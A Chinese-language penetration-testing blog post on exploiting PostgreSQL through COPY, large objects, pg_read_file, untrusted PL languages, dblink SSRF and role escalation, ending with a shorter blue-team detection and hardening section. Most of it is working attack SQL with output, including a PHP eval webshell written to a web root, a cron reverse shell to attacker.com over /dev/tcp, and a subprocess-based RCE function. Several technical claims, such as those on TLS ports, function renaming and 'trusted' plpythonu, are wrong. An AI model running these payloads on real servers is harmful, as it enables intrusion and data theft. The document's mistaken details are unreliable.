---
title: "PostgreSQL COPY/lo_import/dblink/PL语言 RCE与文件读写提权利用技术"
date: 2026-06-17T14:30:00+08:00
draft: false
weight: 83
description: "围绕 PostgreSQL 的 COPY 命令文件读写、lo_import/lo_export 大对象操作、dblink SSRF、PL/Python/PL/Perl 代码执行、pg_read_file/pg_write_file 文件操作，分析打点识别、数据库枚举、RCE 利用链、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "关系数据库", "PostgreSQL", "COPY", "RCE", "文件读写", "提权"]
---

# PostgreSQL COPY/lo_import/dblink/PL语言 RCE与文件读写提权利用技术

`PostgreSQL` 是最先进的开源关系数据库之一，但它的丰富功能也意味着巨大的攻击面。一个典型生产部署里，PostgreSQL 至少同时暴露了以下攻击面：

- **Wire Protocol 面**：PostgreSQL 协议端口（默认 `5432`，TLS 为 `5433`），处理所有 SQL 查询
- **COPY 命令面**：`COPY TO/FROM` 可在数据库与文件之间批量传输数据
- **大对象面**：`lo_import`/`lo_export` 可将文件导入为大对象或导出到文件系统
- **dblink 面**：`dblink` 扩展可建立到其他数据库的连接，也可用于 SSRF
- **PL 语言面**：PL/Python、PL/Perl、PL/Tcl 等过程语言可在数据库内执行系统命令
- **文件操作面**：`pg_read_file`/`pg_write_file` 可直接读写服务器文件
- **权限提升面**：角色与权限管理不当可导致从普通用户提升到超级用户

对攻击者来说，PostgreSQL 的价值不在于某个单一漏洞，而在于它把数据存储、文件操作、代码执行与集群控制集中在同一进程里。一旦获得数据库访问权限（弱密码、默认凭据、SQL 注入），攻击者可以通过 `COPY` 命令读写任意文件、通过 PL/Python 执行系统命令、通过 `dblink` 进行 SSRF 攻击内网服务，甚至从普通数据库用户提升到超级用户。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 PostgreSQL
2. 哪些未认证或弱认证场景最值得优先探测
3. 如何通过 `COPY` 命令实现文件读写
4. 如何通过 `lo_import`/`lo_export` 操作大对象
5. 如何通过 PL/Python/PL/Perl 实现 RCE
6. 如何通过 `dblink` 进行 SSRF 攻击
7. 如何从普通用户提升到超级用户
8. 历史 CVE 链如何从信息泄露直接打到 RCE
9. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:5432/` — PostgreSQL 协议端口（明文/TLS）
- `:5433/` — PostgreSQL TLS 端口（备选）

### 0.2 协议特征

PostgreSQL 使用 PostgreSQL Wire Protocol。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 5432 postgresql.target.example --script pgsql-info
```

```text
PORT     STATE SERVICE
5432/tcp open  postgresql
| pgsql-info:
|   Version: PostgreSQL 16.1 on x86_64-pc-linux-gnu
|   Backend PID: 1234
|   Authentication: md5
|   Database: postgres
```

### 0.3 手动探测

也可以使用 `psql` 客户端手动连接：

```bash
psql -h postgresql.target.example -p 5432 -U postgres
```

如果返回密码提示，说明需要认证。如果直接连接成功，说明未授权访问。

### 0.4 打点收益优先级

1. 确认目标为 PostgreSQL、版本号与认证方式
2. 通过 `version()` 回收系统信息
3. 通过 `pg_database` 枚举所有数据库
4. 通过 `pg_tables` 枚举所有表
5. 通过 `pg_roles` 枚举所有角色与权限
6. 判断 `COPY` 命令是否可用
7. 判断 PL/Python/PL/Perl 是否安装
8. 判断 `dblink` 扩展是否安装
9. 判断 `pg_read_file`/`pg_write_file` 是否可用

---

## 1. 首轮识别：确认目标为 PostgreSQL

### 1.1 nmap 脚本探测

```bash
nmap -p 5432 postgresql.target.example --script pgsql-info
```

```text
PORT     STATE SERVICE
5432/tcp open  postgresql
| pgsql-info:
|   Version: PostgreSQL 16.1 on x86_64-pc-linux-gnu
|   Backend PID: 1234
|   Authentication: md5
|   Database: postgres
```

直接回收：

- PostgreSQL 版本
- 操作系统与架构
- 后端进程 ID
- 认证方式（md5/scram-sha-256/trust）
- 默认数据库

### 1.2 psql 连接

```bash
psql -h postgresql.target.example -p 5432 -U postgres
```

```text
Password for user postgres:
```

如果返回密码提示，说明需要认证。

如果使用 `trust` 认证方式：

```bash
psql -h postgresql.target.example -p 5432 -U postgres
```

```text
psql (16.1)
Type "help" for help.

postgres=#
```

直接连接成功，说明未授权访问。

### 1.3 版本查询

```sql
SELECT version();
```

```text
PostgreSQL 16.1 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 11.4.0, 64-bit
```

### 1.4 当前用户与权限

```sql
SELECT current_user, session_user;
```

```text
current_user | session_user
-------------+--------------
postgres     | postgres
```

```sql
SELECT rolsuper, rolcreatedb, rolcreaterole, rolcanlogin FROM pg_roles WHERE rolname = current_user;
```

```text
rolsuper | rolcreatedb | rolcreaterole | rolcanlogin
---------+-------------+---------------+-------------
t        | t           | t             | t
```

暴露当前用户是否为超级用户。

---

## 2. 数据库与表枚举

### 2.1 数据库列表

```sql
SELECT datname FROM pg_database WHERE datistemplate = false;
```

```text
datname
-----------
postgres
app_db
user_data
logs
config
```

### 2.2 表列表

```sql
SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema');
```

```text
schemaname | tablename
------------+-----------
public     | users
public     | sessions
public     | orders
public     | payments
public     | config
public     | logs
```

### 2.3 列信息

```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';
```

```text
column_name  | data_type
-------------+-----------
id           | integer
username     | character varying
email        | character varying
password_hash| character varying
role         | character varying
api_key      | character varying
created_at   | timestamp
```

### 2.4 数据采样

```sql
SELECT * FROM users LIMIT 5;
```

```text
id | username | email              | password_hash                          | role          | api_key                        | created_at
---+----------+--------------------+---------------------------------------+---------------+--------------------------------+---------------------
1  | admin    | admin@example.com  | $2b$12$Lq8aZVx8aZVx8aZVx8aZVx8aZVx | administrator | EXAMPLE_API_KEY_NOT_REAL_VALUE   | 2026-01-15 10:00:00
2  | user1    | user1@example.com  | $2b$12$Xy9bWz9bWz9bWz9bWz9bWz9bWz9b | user            | EXAMPLE_API_KEY_NOT_REAL_VALUE_2 | 2026-01-16 11:00:00
```

---

## 3. COPY 命令文件读写

### 3.1 COPY TO 文件读取

`COPY TO` 可以将表数据导出到服务器文件系统。

```sql
COPY (SELECT * FROM users) TO '/tmp/users_export.csv' WITH CSV HEADER;
```

如果当前用户为超级用户，可以读取任意文件：

```sql
COPY (SELECT 'test') TO '/etc/passwd';
```

但这会覆盖文件。要读取文件内容，需要结合 `COPY FROM`。

### 3.2 COPY FROM 文件写入

`COPY FROM` 可以从服务器文件系统导入数据到表。

首先创建表：

```sql
CREATE TABLE file_content(line text);
```

然后导入文件：

```sql
COPY file_content FROM '/etc/passwd';
```

```sql
SELECT * FROM file_content;
```

```text
line
--------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/postgresql:/bin/bash
```

### 3.3 COPY 写入文件

如果当前用户为超级用户，可以写入任意文件：

```sql
COPY (SELECT '<?php @eval($_POST["cmd"]); ?>') TO '/var/www/html/shell.php';
```

```sql
COPY (SELECT '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"') TO '/etc/cron.d/backdoor';
```

### 3.4 COPY 限制

- 只有超级用户可以使用 `COPY` 读写服务器文件
- 普通用户只能使用 `COPY` 在客户端与表之间传输数据
- `COPY` 不能读取目录，只能读取文件
- 文件路径必须是绝对路径

---

## 4. lo_import/lo_export 大对象操作

### 4.1 lo_import 文件导入

`lo_import` 可以将服务器文件导入为大对象（Large Object）。

```sql
SELECT lo_import('/etc/passwd');
```

```text
lo_import
-----------
    123456
```

返回大对象 OID。

### 4.2 读取大对象内容

```sql
CREATE TABLE lo_test(data bytea);
INSERT INTO lo_test VALUES (lo_get(123456));
SELECT convert_from(data, 'UTF8') FROM lo_test;
```

```text
convert_from
--------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/postgresql:/bin/bash
```

### 4.3 lo_export 文件导出

`lo_export` 可以将大对象导出到服务器文件系统。

```sql
SELECT lo_export(123456, '/tmp/passwd_export');
```

### 4.4 lo_import/lo_export 限制

- 只有超级用户可以使用 `lo_import`/`lo_export`
- 普通用户无法操作大对象

---

## 5. pg_read_file/pg_write_file 文件操作

### 5.1 pg_read_file 文件读取

`pg_read_file` 可以读取服务器文件（PostgreSQL 9.1+）。

```sql
SELECT pg_read_file('/etc/passwd');
```

```text
pg_read_file
--------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/postgresql:/bin/bash
```

读取部分文件：

```sql
SELECT pg_read_file('/etc/passwd', 0, 100);
```

### 5.2 pg_write_file 文件写入

`pg_write_file` 可以写入服务器文件（PostgreSQL 9.1+，需要超级用户）。

```sql
SELECT pg_write_file('/tmp/test.txt', 'test content');
```

### 5.3 pg_read_file/pg_write_file 限制

- `pg_read_file` 只能读取 PostgreSQL 数据目录下的文件（除非是超级用户）
- `pg_write_file` 只有超级用户可以使用
- 这些函数在 PostgreSQL 10+ 中被重命名为 `pg_read_file`/`pg_write_file`（之前是 `pg_read_binary_file`/`pg_write_binary_file`）

---

## 6. PL/Python/PL/Perl 代码执行

### 6.1 检查已安装的 PL 语言

```sql
SELECT lanname FROM pg_language;
```

```text
lanname
---------
internal
c
sql
plpgsql
plpython3u
plperlu
```

`plpython3u` 表示 PL/Python 3（untrusted），`plperlu` 表示 PL/Perl（untrusted）。

### 6.2 PL/Python RCE

如果 `plpython3u` 已安装，可以创建函数执行系统命令：

```sql
CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$
import subprocess
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
return result.stdout + result.stderr
$$ LANGUAGE plpython3u;
```

```sql
SELECT rce('id');
```

```text
rce
--------------------------------
uid=26(postgres) gid=26(postgres) groups=26(postgres)
```

```sql
SELECT rce('cat /etc/hostname');
```

```text
rce
--------------------------------
postgresql-host-01
```

### 6.3 PL/Perl RCE

如果 `plperlu` 已安装：

```sql
CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$
my $output = `$_[0] 2>&1`;
return $output;
$$ LANGUAGE plperlu;
```

```sql
SELECT rce('id');
```

```text
rce
--------------------------------
uid=26(postgres) gid=26(postgres) groups=26(postgres)
```

### 6.4 PL/Tcl RCE

如果 `pltclu` 已安装：

```sql
CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$
set output [exec $_(cmd) 2>&1]
return $output
$$ LANGUAGE pltclu;
```

### 6.5 PL 语言限制

- 只有超级用户可以创建 `untrusted` 语言函数（`plpython3u`、`plperlu`、`pltclu`）
- `trusted` 语言（`plpythonu`、`plperl`）不允许执行系统命令
- 如果 PL 语言未安装，需要先安装扩展

---

## 7. dblink SSRF 攻击

### 7.1 检查 dblink 扩展

```sql
SELECT * FROM pg_extension WHERE extname = 'dblink';
```

```text
extname
---------
dblink
```

### 7.2 dblink 连接

`dblink` 可以建立到其他数据库的连接。

```sql
SELECT dblink_connect('myconn', 'host=attacker.com port=5432 dbname=postgres user=postgres password=postgres');
```

### 7.3 dblink SSRF

攻击者可以利用 `dblink` 连接内网服务：

```sql
SELECT dblink_connect('myconn', 'host=10.20.30.50 port=5432 dbname=postgres user=postgres password=postgres');
SELECT * FROM dblink('myconn', 'SELECT * FROM sensitive_data') AS t(id int, data text);
```

### 7.4 dblink DNS 解析

`dblink` 会进行 DNS 解析，可以用于探测内网主机：

```sql
SELECT dblink_connect('myconn', 'host=internal-service.local port=5432 dbname=postgres user=postgres password=postgres');
```

如果连接超时，说明主机不存在或端口未开放。如果连接被拒绝，说明主机存在但 PostgreSQL 未运行。

### 7.5 dblink 限制

- 需要安装 `dblink` 扩展
- 需要网络连接权限
- 连接字符串中的密码会记录在日志中

---

## 8. 权限提升

### 8.1 从普通用户提升到超级用户

如果当前用户有 `CREATEROLE` 权限，可以将自己提升为超级用户：

```sql
ALTER ROLE current_user WITH SUPERUSER;
```

### 8.2 通过函数所有权提升

如果普通用户拥有某个函数的所有权，且该函数由超级用户创建，可以通过修改函数实现提权：

```sql
CREATE OR REPLACE FUNCTION escalate() RETURNS void AS $$
BEGIN
  EXECUTE 'ALTER ROLE ' || current_user || ' WITH SUPERUSER';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 8.3 通过 pg_read_all_settings 提权

PostgreSQL 10+ 中，`pg_read_all_settings` 角色可以读取所有配置，包括密码：

```sql
GRANT pg_read_all_settings TO current_user;
```

### 8.4 通过 CVE-2018-1058 提权

PostgreSQL 9.3-10.3 中存在 CVE-2018-1058，允许普通用户通过 `SEARCH_PATH` 劫持执行超级用户的操作。

```sql
SET search_path = 'malicious_schema';
```

如果超级用户在不指定 schema 的情况下执行函数，会先查找 `malicious_schema` 中的同名函数。

---

## 9. 历史 CVE 与风险链

### 9.1 CVE-2018-1058：SEARCH_PATH 劫持

- **影响版本**：PostgreSQL 9.3-10.3
- **CVSS**：6.5（Medium）
- **核心问题**：`SEARCH_PATH` 可被普通用户控制，导致超级用户执行恶意函数
- **利用条件**：需要普通数据库用户权限
- **影响**：权限提升

### 9.2 CVE-2023-5868：内存损坏

- **影响版本**：PostgreSQL 16.0
- **CVSS**：7.5（High）
- **核心问题**：特定查询可导致内存损坏
- **利用条件**：需要数据库查询权限
- **影响**：拒绝服务或潜在的代码执行

### 9.3 综合风险链

```
端口扫描 → :5432 PostgreSQL Wire Protocol
         ↓
psql 连接 → 确认认证方式（trust/md5/scram-sha-256）
         ↓
弱密码/默认凭据 → 获取数据库访问权限
         ↓
version() → 系统画像（版本、OS、架构）
         ↓
pg_database → 枚举所有数据库
         ↓
pg_tables → 枚举所有表
         ↓
SELECT * FROM users → 读取敏感数据（用户、密码哈希、API Key）
         ↓
COPY FROM '/etc/passwd' → 读取服务器文件
         ↓
COPY TO '/var/www/html/shell.php' → 写入 WebShell
         ↓
lo_import('/etc/shadow') → 读取密码文件
         ↓
plpython3u → CREATE FUNCTION rce() → 执行系统命令
         ↓
ALTER ROLE current_user WITH SUPERUSER → 权限提升
         ↓
dblink → SSRF 攻击内网服务
```

---

## 10. 蓝队视角：日志痕迹与防守

### 10.1 关键日志源

**PostgreSQL 日志**：

```text
2026-06-17 10:15:23.445 UTC [1234] LOG:  connection received: host=10.0.3.47 port=48291
2026-06-17 10:15:24.129 UTC [1234] LOG:  connection authorized: user=postgres database=postgres
2026-06-17 10:15:25.000 UTC [1234] LOG:  statement: COPY file_content FROM '/etc/passwd'
2026-06-17 10:15:26.000 UTC [1234] LOG:  statement: CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$
```

### 10.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 未授权访问 | `connection authorized` 无密码 | 严重 |
| `COPY FROM` 文件读取 | `COPY .* FROM '/.*'` | 严重 |
| `COPY TO` 文件写入 | `COPY .* TO '/.*'` | 严重 |
| `lo_import` 大对象导入 | `lo_import` | 严重 |
| `lo_export` 大对象导出 | `lo_export` | 严重 |
| `pg_read_file` 文件读取 | `pg_read_file` | 严重 |
| `pg_write_file` 文件写入 | `pg_write_file` | 严重 |
| PL/Python 函数创建 | `CREATE FUNCTION .* plpython3u` | 严重 |
| PL/Perl 函数创建 | `CREATE FUNCTION .* plperlu` | 严重 |
| `dblink` 连接 | `dblink_connect` | 高 |
| `ALTER ROLE` 提权 | `ALTER ROLE .* SUPERUSER` | 严重 |
| 非预期来源的连接 | 外部 IP 连接 5432 | 严重 |

### 10.3 网络层防护

- PostgreSQL 端口 `5432` 不应直接暴露到公网
- 使用 `listen_addresses` 限制监听地址
- 使用 `pg_hba.conf` 限制连接来源
- 启用 TLS 加密通信
- 使用强密码或证书认证
- 禁用 `trust` 认证方式

### 10.4 配置加固

- 升级 PostgreSQL 到最新稳定版本，修复所有已知 CVE
- 禁用不必要的 PL 语言（`plpython3u`、`plperlu`、`pltclu`）
- 禁用 `dblink` 扩展
- 限制 `COPY` 命令的使用（只允许超级用户）
- 限制 `lo_import`/`lo_export` 的使用
- 限制 `pg_read_file`/`pg_write_file` 的使用
- 启用审计日志并推送到不可篡改存储
- 定期审计用户权限与角色

---

## 11. 审查清单

| 检查项 | 说明 |
|--------|------|
| 5432 端口是否对外暴露 | 确认 PostgreSQL 协议可达范围 |
| 认证方式是否安全 | 检查 `pg_hba.conf`，禁用 `trust` |
| 是否使用 TLS | 检查 `ssl` 配置 |
| 是否禁用不必要的 PL 语言 | 检查 `pg_language` |
| 是否禁用 `dblink` 扩展 | 检查 `pg_extension` |
| `COPY` 命令是否受限 | 检查用户权限 |
| `lo_import`/`lo_export` 是否受限 | 检查用户权限 |
| `pg_read_file`/`pg_write_file` 是否受限 | 检查用户权限 |
| 是否存在弱密码 | 检查所有用户密码 |
| 版本是否已修复已知 CVE | 对比 PostgreSQL 版本号 |
| 是否启用审计日志 | 检查 `log_statement` 配置 |
| `listen_addresses` 是否受限 | 检查监听地址 |

---

## 12. 总结

PostgreSQL 的攻击面价值在于它把数据存储、文件操作、代码执行与集群控制集中在同一进程里。获得数据库访问权限后，攻击者可以通过 `COPY` 命令读写任意文件、通过 PL/Python 执行系统命令、通过 `dblink` 进行 SSRF 攻击，甚至从普通用户提升到超级用户。

从攻击者视角看，最高效的路径是：

1. 通过 nmap 确认目标为 PostgreSQL
2. 通过 psql 确认认证方式与弱密码
3. 通过 `version()` 回收系统画像
4. 通过 `pg_database`/`pg_tables` 枚举数据库与表
5. 通过 `SELECT` 读取敏感数据
6. 通过 `COPY FROM` 读取服务器文件
7. 通过 `COPY TO` 写入 WebShell 或 crontab
8. 通过 PL/Python/PL/Perl 实现 RCE
9. 通过 `ALTER ROLE` 提升权限
10. 通过 `dblink` 进行 SSRF 攻击内网

从防守视角看，核心措施是：

1. 永远不要将 PostgreSQL 暴露到公网
2. 禁用 `trust` 认证方式，使用强密码或证书认证
3. 使用 `pg_hba.conf` 限制连接来源
4. 禁用不必要的 PL 语言与扩展
5. 限制 `COPY`、`lo_import`、`pg_read_file` 等高危命令
6. 启用审计日志并推送到不可篡改存储
7. 定期审计用户权限与角色
